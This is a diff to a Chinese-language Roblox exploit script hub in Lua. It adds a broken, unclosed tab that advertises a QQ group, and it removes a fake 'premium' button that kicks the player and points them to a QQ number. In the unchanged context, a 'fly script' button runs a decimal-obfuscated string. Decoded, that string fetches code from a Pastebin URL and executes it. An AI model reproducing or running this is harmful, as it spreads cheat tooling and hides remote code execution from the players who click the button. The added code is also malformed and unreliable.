@@ -24,6 +24,14 @@ about:AddParagraph("您的用户名:"," "..game.Players.LocalPlayer.Name.."")
 about:AddParagraph("您的注入器:"," "..identifyexecutor().."")
 about:AddParagraph("您当前服务器的ID"," "..game.GameId.."")
 
+local Tab =Window:MakeTab({
+Tab:AddButton({
+	Name = "复制作者QQ群",
+	Callback = function()
+     setclipboard("929573644")
+  	end
+})
+
 local Tab = Window:MakeTab({
 	Name = "惊喜大盲盒",
 	Icon = "rbxassetid://10527577695",
@@ -67,18 +75,5 @@ Tab:AddButton({
   Name = "飞行脚本",
   Callback = function()
     loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\90\66\122\99\84\109\49\102\34\41\41\40\41\10")()
-  end
-})
-
-local Tab = Window:MakeTab({
-	Name = "死铁轨脚本",
-	Icon = "rbxassetid://10527577695",
-	PremiumOnly = false
-})
-
-Tab:AddButton({
-  Name = "高级版本",
-  Callback = function()
-    game.Players.LocalPlayer:Kick("由于该脚本在死铁轨执行会被ban,添加3598439173即可解锁脚本")
   end
 })
